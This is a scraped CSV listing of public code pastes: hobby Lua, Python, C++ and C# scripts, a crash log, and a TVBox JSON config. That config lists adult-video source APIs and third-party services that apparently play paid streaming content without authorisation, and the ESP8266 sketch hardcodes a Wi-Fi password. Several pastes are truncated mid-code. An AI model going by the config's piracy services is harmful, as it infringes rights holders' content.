id,title,username,language,date,content
utSM8cxk,Untitled,Z_A_K,Lua,Sunday 15th of June 2025 01:00:11 AM CDT,https://rekonise.com/lunor-hub-azlqi after this it will be the last link
RJCiuDk0,18,zhouhy,JSON,Sunday 15th of June 2025 12:44:06 AM CDT,"{

//""spider"":""https://agit.ai/zzzgit/zzz/raw/branch/main/MaooXB2/0926.jar"",
""spider"":""./0926.jar"",

""lives"":[{""group"":""redirect"",""channels"":[{""name"":""redirect"",""urls"":[""proxy://do=live&type=txt&ext=aHR0cHM6Ly9hZ2l0LmFpL2d1b3Q1NC95Z2JoL3Jhdy9icmFuY2gvbWFzdGVyL3pCL3pCLnR4dA==""]}]}],

""sites"":[
{""key"":""*色南国资源"",""name"":""*🔞色南国资源"",""type"":1,""api"":""https://api.sexnguon.com/api.php/provide/vod/"",""searchable"":0,""quickSearch"":0},
{""key"":""*皇冠资源"",""name"":""*🔞皇冠资源"",""type"":1,""api"":""https://hghhh.com/api.php/provide/vod/"",""searchable"":0,""quickSearch"":0},
{ ""key"": ""(18+)JAV名优"", ""name"": ""*🔞JAV名优"", ""type"": 0, ""api"": ""http://mygzycj.com/api.php?ac=list"", ""searchable"": 1, ""quickSearch"": 1, ""filterable"": 0 },	
{ ""key"": ""(18+)秀色资源"", ""name"": ""🔞秀色资源"", ""type"": 0, ""api"": ""https://api.xiuseapi.com/api.php/provide/vod/at/xml"", ""playUrl"": ""https://player.leyuzy.net/?url="", ""searchable"": 1, ""quickSearch"": 1, ""filterable"": 0 },	
{""key"": ""美少女"",""name"": ""*🔞美少女"",""type"": 0,""api"": ""https://www.msnii.com/api/xml.php"",""searchable"":0,""quickSearch"":0,""filterable"": 1,""jar"":""https://share.nite07.com/api/v3/file/source/18178/18.jar?sign=4snwZEDuzr88tmVvCLDre0Jjbt5hOKh7zrtE37bQV30%3D%3A0""},
{""key"": ""哥哥妹妹"",""name"": ""*🔞有哥妹"",""type"": 0,""api"": ""http://www.ggmmzy.com:9999/inc/xml"",""searchable"": 0,""quickSearch"": 0,""filterable"": 0,""jar"":""https://share.nite07.com/api/v3/file/source/18178/18.jar?sign=4snwZEDuzr88tmVvCLDre0Jjbt5hOKh7zrtE37bQV30%3D%3A0""},
{""key"": ""*CK资源"",""name"": ""*🔞纯在线"",""type"": 1,""api"": ""http://www.feifei67.com/api.php/provide/vod/"",""searchable"":0,""quickSearch"":0,""filterable"": 0,""jar"":""https://share.nite07.com/api/v3/file/source/18178/18.jar?sign=4snwZEDuzr88tmVvCLDre0Jjbt5hOKh7zrtE37bQV30%3D%3A0""},
{""key"":""*淫水机资源"",""name"":""*🔞淫水机资源"",""type"":0,""api"":""https://www.xrbsp.com/api/xml.php"",""searchable"":0,""quickSearch"":0},
{""key"":""*香奶儿资源"",""name"":""*🔞香奶儿资源"",""type"":0,""api"":""https://www.gdlsp.com/api/xml.php"",""searchable"":0,""quickSearch"":0},
{""key"":""*白嫖资源"",""name"":""*🔞白嫖资源"",""type"":0,""api"":""https://www.kxgav.com/api/xml.php"",""searchable"":0,""quickSearch"":0},
{""key"":""*大地资源"",""name"":""*🔞大地资源"",""type"":0,""api"":""https://dadiapi.com/api.php"",""searchable"":0,""quickSearch"":0},
{""key"":""*老鸭资源"",""name"":""*🔞老鸭资源"",""type"":1,""api"":""https://api.apilyzy.com/api.php/provide/vod/"",""searchable"":0,""quickSearch"":0},
{ ""key"": ""(18+)天堂福利"", ""name"": ""🔞天堂福利"", ""type"": 0, ""api"": ""https://bttcj.com/inc/sapi.php"", ""searchable"": 1, ""quickSearch"": 1, ""filterable"": 0 },
{ ""key"": ""KpgxdyE"", ""name"": ""🔞黄AV资源(已修复)"", ""type"": 0, ""api"": ""https://www.pgxdy.com/api/xml.php"", ""searchable"": 1, ""quickSearch"": 1, ""filterable"": 1 },
{""key"":""*玖玖资源"",""name"":""*🔞玖玖资源"",""type"":0,""api"":""http://99zywcj.com/inc/sapi.php?ac=videolist"",""searchable"":0,""quickSearch"":0},
{""key"":""*狼少年"",""name"":""*🔞狼少年"",""type"":0,""api"":""http://cjmygzy.com/inc/sapi.php?ac=videolist"",""searchable"":0,""quickSearch"":0},
{""key"":""*鲨鱼资源"",""name"":""*🔞鲨鱼资源"",""type"":1,""api"":""https://shayuapi.com/api.php/provide/vod/"",""searchable"":0,""quickSearch"":0},
{""key"":""博天堂"",""name"":""博天堂-伦理"",""type"":0,""api"":""http://bttcj.com/inc/sapi.php"",""searchable"":1,""quickSearch"":1,""filterable"":1},
{""key"":""*速度资源"",""name"":""*🔞速度资源"",""type"":0,""api"":""http://www.ggmmzy.com:9999/inc/xml"",""searchable"":0,""quickSearch"":0},
{""key"":""KK写真资源"",""name"":""KK写真资源"",""type"":1,""api"":""https://kkzy.me/api.php/provide/vod/"",""searchable"":1,""quickSearch"":1,""filterable"":1},
{""key"":""环亚资源"",""name"":""环亚资源"",""type"":0,""api"":""http://wmcj8.com/inc/sapi.php"",""searchable"":1,""quickSearch"":1,""filterable"":1},
{""key"":""黄AV资源"",""name"":""黄AV资源"",""type"":0, ""api"":""https://www.pgxdy.com/api/xml.php"",""searchable"":1,""quickSearch"":1,""filterable"":1},
{""key"":""白嫖资源"",""name"":""白嫖资源"",""type"":0,""api"":""https://www.kxgav.com/api/xml.php"",""searchable"":1,""quickSearch"":1,""filterable"":1}

],


""parses"":[
  {""name"":""解析聚合"",""type"":3,""url"":""Demo""},
{""name"":""Json并发"",""type"":2,""url"":""Parallel""},
{""name"":""Json轮询"",""type"":2,""url"":""Sequence""},
{
		""name"": ""云you解析①"",
		""type"": 1,
		""url"": ""http://chaloli.cn/home/api?type=ys&uid=1&key=dfgilnotuyDGHMQW34&url""
	}, 
	{
		""name"": ""解析01"",
		""type"": 1,
		""url"": ""https://svip.znjson.com/api/?key=gX8j9IPvoQ5mFmlIzu&url=""
	},	
	{
		""name"": ""解析02"",
		""type"": 1,
		""url"": ""https://hc.izny.cn/json.php?url=""
	},		
	{
	    ""name"":""OK"",
	    ""type"":0,
	    ""url"":""https://okjx.cc/?url=""
	},
	{
		""name"": ""解析02"",
		""type"": 0,
		""url"": ""https://www.nxflv.com/?url=""
	}, 
	{
		""name"": ""牛逼解析"",
		""type"": 0,
		""url"": ""https://nbjx.vip/?url=""
	}, 
	{
		""name"": ""parwix"",
		""type"": 0,
		""url"": ""https://jx.parwix.com:4433/player/?url=""
	}, 	
{""name"":""恩哥"", ""type"":1,""url"":""http://newjiexi.gotka.top/keyu3.php?url="",""ext"":{""flag"":[ ""qq"",""腾讯"",""qiyi"",""爱奇艺"",""奇艺"",""youku"",""优酷"",""mgtv"",""芒果"",""letv"",""乐视"",""pptv"",""PPTV"",""sohu"",""bilibili"",""哔哩哔哩"",""哔哩""],""header"":{""User-Agent"":""okhttp/4.1.0""}}},
{""name"":""365"",""type"":0,""url"": ""https://chaxun.truechat365.com/?url="",""ext"":{""flag"":[""qq"",""腾讯"",""qiyi"",""iqiyi"",""爱奇艺"",""奇艺"",""youku"",""优酷"",""mgtv"",""芒果"",""letv"",""乐视"",""pptv"",""PPTV"",""sohu"",""bilibili"",""哔哩哔哩"",""哔哩""]}},
{""name"":""8old"",""type"":0,""url"":""https://www.m3u8.tv.cdn.8old.cn/jx.php?url="",""ext"":{""flag"":[""qq"",""腾讯"",""qiyi"",""iqiyi"",""爱奇艺"",""奇艺"",""youku"",""优酷"",""mgtv"",""芒果"",""letv"",""乐视"",""pptv"",""PPTV"",""sohu"",""bilibili"",""哔哩哔哩"",""哔哩""]}},
{""name"": ""ZNJSON解析"",""type"": 1,""url"": ""https://svip.znjson.com/api/?key=gX8j9IPvoQ5mFmlIzu&url=""}, 

	{
		""name"": ""解析06"",
		""type"": 0,
		""url"": ""https://vip.parwix.com:4433/player/?url=""
	},	
	{
		""name"": ""parwix稳定"",
		""type"": 0,
		""url"": ""https://jx.bozrc.com:4433/player/?url=""
	}, 
	{
		""name"": ""OKjx综合"",
		""type"": 0,
		""url"": ""https://okjx.cc/?url=""
	},
{""name"":""B站1"",""type"":0,""url"":""https://jx.bozrc.com:4433/player/?url=""},
{""name"":""爱豆"",""type"":0,""url"":""https://jx.aidouer.net/?url=""},
{""name"":""H8"",""type"":0,""url"":""https://www.h8jx.com/jiexi.php?url=""},
{""name"":""解析"",""type"":0,""url"":""https://ckmov.ccyjjd.com/ckmov/?url=""},
{""name"":""思古3"",""type"":0,""url"":""https://jsap.attakids.com/?url=""},
{""name"":""云端1"",""type"":0,""url"":""https://js.52jx.top:2525/?url=""},
{""name"":""云端2"",""type"":0,""url"":""https://sb.5gseo.net/?url=""}

],
""flags"":[""youku"",""qq"",""iqiyi"",""qiyi"",""letv"",""sohu"",""tudou"",""pptv"",""mgtv"",""wasu"",""bilibili"",""renrenmi""],
""ijk"":[
{""group"":""软解码"",""options"":[
{""category"":4,""name"":""opensles"",""value"":""0""},
{""category"":4,""name"":""overlay-format"",""value"":""842225234""},
{""category"":4,""name"":""framedrop"",""value"":""1""},
{""category"":4,""name"":""soundtouch"",""value"":""1""},
{""category"":4,""name"":""start-on-prepared"",""value"":""1""},
{""category"":1,""name"":""http-detect-range-support"",""value"":""0""},
{""category"":1,""name"":""fflags"",""value"":""fastseek""},
{""category"":2,""name"":""skip_loop_filter"",""value"":""48""},
{""category"":4,""name"":""reconnect"",""value"":""1""},
{""category"":4,""name"":""enable-accurate-seek"",""value"":""0""},
{""category"":4,""name"":""mediacodec"",""value"":""0""},
{""category"":4,""name"":""mediacodec-auto-rotate"",""value"":""0""},
{""category"":4,""name"":""mediacodec-handle-resolution-change"",""value"":""0""},
{""category"":4,""name"":""mediacodec-hevc"",""value"":""0""},
{""category"":1,""name"":""dns_cache_timeout"",""value"":""600000000""}
]},
{""group"":""硬解码"",""options"":[
{""category"":4,""name"":""opensles"",""value"":""0""},
{""category"":4,""name"":""overlay-format"",""value"":""842225234""},
{""category"":4,""name"":""framedrop"",""value"":""1""},
{""category"":4,""name"":""soundtouch"",""value"":""1""},
{""category"":4,""name"":""start-on-prepared"",""value"":""1""},
{""category"":1,""name"":""http-detect-range-support"",""value"":""0""},
{""category"":1,""name"":""fflags"",""value"":""fastseek""},
{""category"":2,""name"":""skip_loop_filter"",""value"":""48""},
{""category"":4,""name"":""reconnect"",""value"":""1""},
{""category"":4,""name"":""enable-accurate-seek"",""value"":""0""},
{""category"":4,""name"":""mediacodec"",""value"":""1""},
{""category"":4,""name"":""mediacodec-auto-rotate"",""value"":""1""},
{""category"":4,""name"":""mediacodec-handle-resolution-change"",""value"":""1""},
{""category"":4,""name"":""mediacodec-hevc"",""value"":""1""},
{""category"":1,""name"":""dns_cache_timeout"",""value"":""600000000""}
]}
],
""wallpaper"":""http://www.kf666888.cn/api/tvbox/img"",
""ads"":[""mimg.0c1q0l.cn"",""www.googletagmanager.com"",""www.google-analytics.com"",""mc.usihnbcq.cn"",""mg.g1mm3d.cn"",""mscs.svaeuzh.cn"",""cnzz.hhttm.top"",""tp.vinuxhome.com"",""cnzz.mmstat.com"",""www.baihuillq.com"",""s23.cnzz.com"",""z3.cnzz.com"",""c.cnzz.com"",""stj.v1vo.top"",""z12.cnzz.com"",""img.mosflower.cn"",""tips.gamevvip.com"",""ehwe.yhdtns.com"",""xdn.cqqc3.com"",""www.jixunkyy.cn"",""sp.chemacid.cn"",""hm.baidu.com"",""s9.cnzz.com"",""z6.cnzz.com"",""um.cavuc.com"",""mav.mavuz.com"",""wofwk.aoidf3.com"",""z5.cnzz.com"",""xc.hubeijieshikj.cn"",""tj.tianwenhu.com"",""xg.gars57.cn"",""k.jinxiuzhilv.com"",""cdn.bootcss.com"",""ppl.xunzhuo123.com"",""xomk.jiangjunmh.top"",""img.xunzhuo123.com"",""z1.cnzz.com"",""s13.cnzz.com"",""xg.huataisangao.cn"",""z7.cnzz.com"",""xg.huataisangao.cn"",""z2.cnzz.com"",""s96.cnzz.com"",""q11.cnzz.com"",""thy.dacedsfa.cn"",""xg.whsbpw.cn"",""s19.cnzz.com"",""z8.cnzz.com"",""s4.cnzz.com"",""f5w.as12df.top"",""ae01.alicdn.com"",""www.92424.cn"",""k.wudejia.com"",""vivovip.mmszxc.top"",""qiu.xixiqiu.com"",""cdnjs.hnfenxun.com"",""cms.qdwght.com""]
}"
UB4UFdLn,Kode Program SCT 013,gwynplaine,C++,Sunday 15th of June 2025 12:32:15 AM CDT,"#include <ESP8266WiFi.h>
#include <ESP8266WiFiMulti.h>
#include <ESP8266HTTPClient.h>
// #include <WiFiClientSecureBearSSL.h>

const char* ssid =""prakarya.id"";
const char* pass = ""qwertyqwerty"";

// const char* ssid =""Subarashi!"";
// const char* pass = ""qwertyqwerty"";

WiFiClient client;

// #define analogPin A0
// float gainFactor = 7.6; // rasio resistor 11,5 : 1,5
// int adcValue = 0;
// float nilaiTegangan = 0.00;

const int sensorPin = A0;
const float VREF = 1.0;            // Max ADC voltage on NodeMCU
const int samples = 2000;
const float calibration = 10.0;   // Kalibrasi sesuai datasheet 100A = 1V

void setup() 
{
    pinMode(LED_BUILTIN, OUTPUT);

       Serial.begin(9600);
       delay(10);
               
       Serial.println(""Connecting to "");
       Serial.println(ssid); 
       WiFi.mode(WIFI_STA);

       WiFi.begin(ssid, pass); 
       while (WiFi.status() != WL_CONNECTED) 
          {
            delay(500);
            Serial.print(""."");
          }
      Serial.println("""");
      Serial.println(""WiFi connected""); 
}
 
void loop() 
{      
  //http://127.0.0.1:8000/getnilai/20.59
  //http://192.168.43.128/Laravel/solarpanellaravel/public/
  //http://192.168.43.128/Laravel/solarpanellaravel/public/getnilai/20.59
    if (WiFi.status() == WL_CONNECTED) 
          {
            delay(5000);
            /*
            Serial.println(""conek"");
            digitalWrite(LED_BUILTIN, HIGH);  // turn the LED on (HIGH is the voltage level)
            delay(1000);                      // wait for a second
            digitalWrite(LED_BUILTIN, LOW);   // turn the LED off by making the voltage LOW
            delay(1000); 
            */

             float sum = 0;

            for (int i = 0; i < samples; i++) {
              int raw = analogRead(sensorPin);
              float voltage = (raw / 1024.0) * VREF;   // 10-bit ADC
              float centered = voltage - (VREF / 2);   // Hilangkan offset (0.5V)
              sum += centered * centered;
            }

            float voltageRMS = sqrt(sum / samples);
            float currentRMS = voltageRMS * calibration;
            
           
            // Serial.print(""nilai tegangan = "");
            // Serial.print(nilaiTegangan);
            // Serial.println("" V"");
            delay(5000);

            // std::unique_ptr<BearSSL::WiFiClientSecure>client(new BearSSL::WiFiClientSecure);

            // Ignore SSL certificate validation
            // client->setInsecure();

            String url;
            HTTPClient http;
            // url = ""http://192.168.1.101/Laravel/solarpanellaravel/public/getnilai/"" + String(nilaiTegangan);
            //https://monitora.my.id/getnilai/19.54
            //url = ""https://monitora.my.id/getnilai/"" + String(currentRMS, 2);
            url = ""http://192.168.48.30/getnilai/"" + String(currentRMS, 2);

            http.begin(client, url);
            http.GET();
            http.end();
            Serial.println(url);
            delay(5000);

          }
}
"
05Pep2hn,handtracingModule.py,rhandycan1,Python,Saturday 14th of June 2025 11:55:27 PM CDT,"#Note: name this as ""handtracingModule.py""
import cv2
import mediapipe as mp
import time


class handDetector():
    def __init__(self, mode=False, maxHands=2, modelComp=1, detectionCon=0.5, trackCon=0.5):
        self.mode = mode
        self.maxHands = maxHands
        self.detectionCon = detectionCon
        self.trackCon = trackCon
        self.modelComp = modelComp

        self.mpHands = mp.solutions.hands
        self.hands = self.mpHands.Hands(self.mode, self.maxHands, self.modelComp, self.detectionCon, self.trackCon)
        self.mpDraw = mp.solutions.drawing_utils

    def findHands(self, img, draw=True):
        imgRGB = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)
        self.results = self.hands.process(imgRGB)
        self.drawSpecCircle = self.mpDraw.DrawingSpec(thickness=1, circle_radius=1, color=(255, 51,51))
        self.drawSpecLine = self.mpDraw.DrawingSpec(thickness=3, circle_radius=2, color=(255, 51, 153))
        # print(results.multi_hand_landmarks)

        if self.results.multi_hand_landmarks:
            for handLms in self.results.multi_hand_landmarks:
                if draw:
                    self.mpDraw.draw_landmarks(img, handLms,
                                               self.mpHands.HAND_CONNECTIONS,self.drawSpecCircle,self.drawSpecLine)
        return img

    def findPosition(self, img, handNo=0, draw=True):

        lmList = []
        if self.results.multi_hand_landmarks:
            myHand = self.results.multi_hand_landmarks[handNo]
            for id, lm in enumerate(myHand.landmark):
                # print(id, lm)
                h, w, c = img.shape
                cx, cy = int(lm.x * w), int(lm.y * h)
                # print(id, cx, cy)
                lmList.append([id, cx, cy])
                if draw:
                    cv2.circle(img, (cx, cy), 15, (255, 0, 255), cv2.FILLED)

        return lmList


def main():
    pTime = 0
    cTime = 0
    cap = cv2.VideoCapture(0)
    detector = handDetector()
    while True:
        success, img = cap.read()
        img = detector.findHands(img)
        lmList = detector.findPosition(img)
        if len(lmList) != 0:
            print(lmList[4])

        cTime = time.time()
        fps = 1 / (cTime - pTime)
        pTime = cTime

        cv2.putText(img, str(int(fps)), (10, 70), cv2.FONT_HERSHEY_PLAIN, 3,
                    (255, 0, 255), 3)

        cv2.imshow(""Image"", img)
        cv2.waitKey(1)


if __name__ == ""__main__"":
    main()"
g5VMtpw2,VOLUME CONTROL VER2,rhandycan1,Python,Saturday 14th of June 2025 11:52:47 PM CDT,"# pycaw library : https://github.com/AndreMiras/pycaw

import cv2
import time
import numpy as np
import handtracingModule as htm
import math
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

################################
wCam, hCam = 640, 480
################################

# Configure camera
cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
cap.set(cv2.CAP_PROP_FRAME_WIDTH, wCam)
cap.set(cv2.CAP_PROP_FRAME_HEIGHT, hCam)
cap.set(cv2.CAP_PROP_FPS, 30)
cap.set(cv2.CAP_PROP_FOURCC, cv2.VideoWriter_fourcc(*'MJPG'))  # Setting codec

pTime = 0

detector = htm.handDetector(detectionCon=0.7)

devices = AudioUtilities.GetSpeakers()
interface = devices.Activate(
    IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
volume = cast(interface, POINTER(IAudioEndpointVolume))
volRange = volume.GetVolumeRange()
minVol = volRange[0]
maxVol = volRange[1]
vol = 0
volPer = 0

while True:
    success, img = cap.read()
    img = detector.findHands(img)
    lmList = detector.findPosition(img, draw=False)
    if len(lmList) != 0:
        # Get the coordinates of the index finger tip
        x1, y1 = lmList[8][1], lmList[8][2]

        # Calculate the volume percentage based on the x-coordinate of the index finger
        volPer = np.interp(x1, [80, 550], [0, 100])
        vol = np.interp(x1, [80, 550], [minVol, maxVol])
        volume.SetMasterVolumeLevel(vol, None)

        # Print the volume percentage and volume level for calibration
        print(f'Volume Percentage: {volPer} %')
        print(f'Volume Level: {vol}')

        # Calculate the width of the filled rectangle based on the volume percentage
        fillWidth = int(np.interp(volPer, [0, 100], [80, 550]))

        # Draw the filled rectangle
        cv2.rectangle(img, (80, 400), (fillWidth, 420), (0, 255, 0), -1)

        # Draw the outline of the volume control rectangle
        cv2.rectangle(img, (80, 400), (550, 420), (0, 153, 76), 1)

        # Draw the volume icon
        cv2.rectangle(img, (30, 405), (50, 415), (0, 0, 0), -1)  # Speaker box
        cv2.line(img, (50, 410), (60, 400), (0, 0, 0), 2)  # Speaker cone
        cv2.line(img, (50, 410), (60, 420), (0, 0, 0), 2)  # Speaker cone

        # Display the volume percentage
        cv2.putText(img, f'{int(volPer)} %', (50, 450), cv2.FONT_HERSHEY_COMPLEX, 1, (255, 0, 0), 2)

    #fps
    cTime = time.time()
    fps = 1 / (cTime - pTime)
    pTime = cTime
    cv2.putText(img, f'FPS: {int(fps)}', (40, 50), cv2.FONT_HERSHEY_COMPLEX,
                1, (255, 0, 0), 3)

    # Display the image
    cv2.imshow(""Image"", img)
    if cv2.waitKey(1) & 0xFF == ord('q'):
        break

cap.release()
cv2.destroyAllWindows()
"
G40MLxC4,2025-06-15T12:44:51.845702,powerampache,PHP,Saturday 14th of June 2025 11:44:50 PM CDT,"1.01-80 (80) - DB: 83
java.lang.NullPointerException: Parameter specified as non-null is null: method luci.sixsixsix.powerampache2.domain.models.User.<init>, parameter id
	at luci.sixsixsix.powerampache2.domain.models.User.<init>(Unknown Source:20)
	at luci.sixsixsix.powerampache2.data.remote.dto.UserDtoKt.toUser(UserDto.kt:94)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.getUserNetwork(BaseAmpacheRepository.kt:128)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$getUserNetwork$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:584)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:811)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:715)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:702)

"
YjnFxHtx,Deltarune gml_std_string_split missing function,Werdco,Game Maker,Saturday 14th of June 2025 10:33:37 PM CDT,"function gml_std_string_split(arg0, arg1)
{
    var my_array = [];
    var next_string = """";
    
    for (var i = 1; i <= string_length(arg0); i++)
    {
        var c = string_char_at(arg0, i);
        
        if (c == arg1)
        {
            array_push(my_array, next_string);
            next_string = """";
        }
        else
        {
            next_string = next_string + c;
        }
    }"
PpvTWFJm,CC Advanced Peripherals Inventory Slot Emptier,ecco7777,Lua,Saturday 14th of June 2025 07:53:09 PM CDT,"local manager = peripheral.find(""inventoryManager"")
if not manager then
    error(""No Inventory Manager peripheral found!"")
end

local SLOT = 35  -- Always pull from slot 35

while true do
    local removed = manager.removeItemFromPlayer(""up"", { fromSlot = SLOT })
    if removed and removed > 0 then
        print(string.format(""Moved %d items from slot %d to chest above"", removed, SLOT))
        sleep(0.5)
    else
        -- Nothing to move, try again later
        sleep(1)
    end
end
"
y2YBqPCx,asgtyre,McBaron,Lua,Saturday 14th of June 2025 07:48:04 PM CDT,"-- Smart Filler: With Fuel Estimation & Direction Choice

-- Ask for numeric input
local function askNumber(prompt)
    print(prompt)
    local val = tonumber(read())
    while not val do
        print(""Please enter a valid number:"")
        val = tonumber(read())
    end
    return math.floor(val)
end

-- Ask for direction choice
local function askDirection()
    print(""Build direction? Type 'up' for bottom-to-top or 'down' for top-to-bottom:"")
    local dir = read()
    while dir ~= ""up"" and dir ~= ""down"" do
        print(""Please type 'up' or 'down':"")
        dir = read()
    end
    return dir
end

-- Prompt user
local length = askNumber(""Enter length:"")
local width = askNumber(""Enter width:"")
local height = askNumber(""Enter height:"")
local direction = askDirection()

-- Estimate fuel (very safe estimate: each block = move + turn + dig)
local estimatedMoves = length * width * height * 2
print(""Estimated fuel needed: ""..estimatedMoves)

-- Try refueling from slot 1
turtle.select(1)
if turtle.getFuelLevel() < estimatedMoves then
    print(""Refueling from slot 1..."")
    if not turtle.refuel(64) then
        print(""⚠️ Refuel failed or no valid fuel in slot 1."")
    else
        print(""Refueled. Fuel level: ""..turtle.getFuelLevel())
    end
end

-- Final check
if turtle.getFuelLevel() < estimatedMoves then
    print(""❌ Not enough fuel. Need at least ""..estimatedMoves..""."")
    return
end

print(""✅ Fuel OK. Starting build from ""..direction..""..."")

-- Block selection
local function selectBlock()
    for i = 2, 16 do
        turtle.select(i)
        if turtle.getItemCount() > 0 then return true end
    end
    return false
end

-- Safe forward
local function forward()
    while not turtle.forward() do
        turtle.dig()
        sleep(0.2)
    end
end

-- Safe up/down
local function moveUp()
    while not turtle.up() do
        turtle.digUp()
        sleep(0.2)
    end
end

local function moveDown()
    while not turtle.down() do
        turtle.digDown()
        sleep(0.2)
    end
end

-- Place block below
local function place()
    if not selectBlock() then
        print(""❌ Out of blocks!"")
        return false
    end
    if not turtle.detectDown() then
        return turtle.placeDown()
    end
    return true
end

-- Main fill logic
local function buildLayer()
    for w = 1, width do
        for l = 1, length do
            if not place() then return false end
            if l < length then forward() end
        end
        if w < width then
            if w % 2 == 1 then
                turtle.turnRight()
                forward()
                turtle.turnRight()
            else
                turtle.turnLeft()
                forward()
                turtle.turnLeft()
            end
        end
    end

    -- return to start of row
    if width % 2 == 1 then
        turtle.turnRight()
        for i = 1, length - 1 do forward() end
        turtle.turnRight()
    else
        turtle.turnLeft()
        for i = 1, length - 1 do forward() end
        turtle.turnLeft()
    end

    return true
end

-- Build loop
local function build()
    if direction == ""up"" then
        for h = 1, height do
            print(""Building layer ""..h.."" / ""..height)
            if not buildLayer() then return end
            if h < height then moveUp() end
        end
    else
        for i = 1, height - 1 do moveUp() end
        for h = height, 1, -1 do
            print(""Building layer ""..h.."" / ""..height)
            if not buildLayer() then return end
            if h > 1 then moveDown() end
        end
    end
end

build()
print(""✅ Build complete!"")
"
NwVNdZ7i,Untitled,jefflynch,C#,Saturday 14th of June 2025 07:47:32 PM CDT,"using System;
using UnityEngine;
using UnityEngine.InputSystem;

namespace _Project.Core.Input
{
    public class InputDeviceSwapController : Single<InputDeviceSwapController>
    {
        public enum ControlScheme { MouseAndKeyboard, Gamepad }

        public static event EventHandler OnGamepadUnused;
        public static event EventHandler OnGamepadUsed;
        
        

        [field: SerializeField] public ControlScheme MyControlScheme { get; set; }
        [field: SerializeField] public bool IsCursorVisible { get; set; }
    
        private void OnEnable() => RegisterDeviceSwap();

        private void RegisterDeviceSwap() => InputSystem.onActionChange += HandleInputSystemOnActionChange;

        private void HandleInputSystemOnActionChange(object obj, InputActionChange change)
        {
            if (change == InputActionChange.ActionStarted)
            {
                var inputAction = (InputAction) obj;
                var lastControl = inputAction.activeControl;
                var lastDevice = lastControl.device;
                if (lastDevice == Gamepad.current)
                {
                    //Using GamePad
                    MyControlScheme = ControlScheme.Gamepad;
                    OnGamepadUsed?.Invoke(this, EventArgs.Empty);
                    Cursor.visible = false;
                }
                else if (lastDevice == Keyboard.current || lastDevice == Mouse.current)
                {
                    //Using Mouse & Keyboard
                    MyControlScheme = ControlScheme.MouseAndKeyboard;
                    OnGamepadUnused?.Invoke(this, EventArgs.Empty);
                    Cursor.visible = IsCursorVisible;
                }

                //Debug.Log($""device: {lastDevice.displayName}"");
            }
        }
        
        public static bool IsUsingGamepad() => Get.MyControlScheme == ControlScheme.Gamepad;
        public static bool IsUsingMouseAndKeyboard() => Get.MyControlScheme == ControlScheme.MouseAndKeyboard;
    }
}"
q9wxZk85,Untitled,McBaron,Lua,Saturday 14th of June 2025 07:25:26 PM CDT,"-- Turtle Dirt Filler with Full Debug and Fuel Check

-- Function to prompt for numeric input
local function askForNumber(prompt)
    print(prompt)
    local input = read()
    local number = tonumber(input)
    while not number do
        print(""Please enter a valid number."")
        input = read()
        number = tonumber(input)
    end
    return number
end

-- Ask for area dimensions
local length = askForNumber(""Enter length:"")
local width = askForNumber(""Enter width:"")
local height = askForNumber(""Enter height:"")

print(""Preparing to build area of size ""..length.."" x ""..width.."" x ""..height)

-- Check fuel
local fuel = turtle.getFuelLevel()
if fuel == ""unlimited"" then
    print(""Fuel: Unlimited (creative mode)"")
elseif fuel == 0 then
    print(""ERROR: Turtle has no fuel. Please refuel before running the script."")
    return
else
    print(""Fuel level: ""..fuel)
end

-- Function to select dirt in inventory
local function selectDirt()
    for i = 1, 16 do
        turtle.select(i)
        local item = turtle.getItemDetail()
        if item and item.name:find(""dirt"") then
            print(""Selected dirt in slot ""..i)
            return true
        end
    end
    print(""No dirt found in inventory!"")
    return false
end

-- Place dirt below turtle
local function placeDown()
    if turtle.detectDown() then
        print(""Block already exists below."")
        return true
    end

    if not turtle.placeDown() then
        print(""Trying to select dirt to place..."")
        if not selectDirt() then
            print(""ERROR: Out of dirt. Cannot continue."")
            return false
        end
        if not turtle.placeDown() then
            print(""ERROR: Failed to place dirt even after selecting."")
            return false
        end
    end

    print(""Placed dirt below."")
    return true
end

-- Move forward with feedback and fuel check
local function forward()
    local tries = 0
    while not turtle.forward() do
        if turtle.getFuelLevel() == 0 then
            print(""ERROR: Out of fuel!"")
            return false
        end
        print(""Blocked. Digging forward..."")
        turtle.dig()
        sleep(0.5)
        tries = tries + 1
        if tries > 10 then
            print(""ERROR: Can't move forward after multiple attempts."")
            return false
        end
    end
    return true
end

-- Move up with feedback and fuel check
local function moveUp()
    local tries = 0
    while not turtle.up() do
        if turtle.getFuelLevel() == 0 then
            print(""ERROR: Out of fuel!"")
            return false
        end
        print(""Blocked above. Digging up..."")
        turtle.digUp()
        sleep(0.5)
        tries = tries + 1
        if tries > 10 then
            print(""ERROR: Can't move up after multiple attempts."")
            return false
        end
    end
    return true
end

-- Build one hori
"
e2taHwxT,Untitled,McBaron,Lua,Saturday 14th of June 2025 07:19:00 PM CDT,"-- Turtle Dirt Filler with Debug Feedback

-- Function to prompt for numeric input
local function askForNumber(prompt)
    print(prompt)
    local input = read()
    local number = tonumber(input)
    while not number do
        print(""Please enter a valid number."")
        input = read()
        number = tonumber(input)
    end
    return number
end

-- Ask for area dimensions
local length = askForNumber(""Enter length:"")
local width = askForNumber(""Enter width:"")
local height = askForNumber(""Enter height:"")

print(""Preparing to build area of size ""..length.."" x ""..width.."" x ""..height)

-- Function to select dirt in inventory
local function selectDirt()
    for i = 1, 16 do
        turtle.select(i)
        local item = turtle.getItemDetail()
        if item and item.name:find(""dirt"") then
            print(""Selected dirt in slot ""..i)
            return true
        end
    end
    print(""No dirt found in inventory!"")
    return false
end

-- Place dirt below turtle
local function placeDown()
    if turtle.detectDown() then
        print(""Block already exists below."")
        return true
    end

    if not turtle.placeDown() then
        print(""Trying to select dirt to place..."")
        if not selectDirt() then
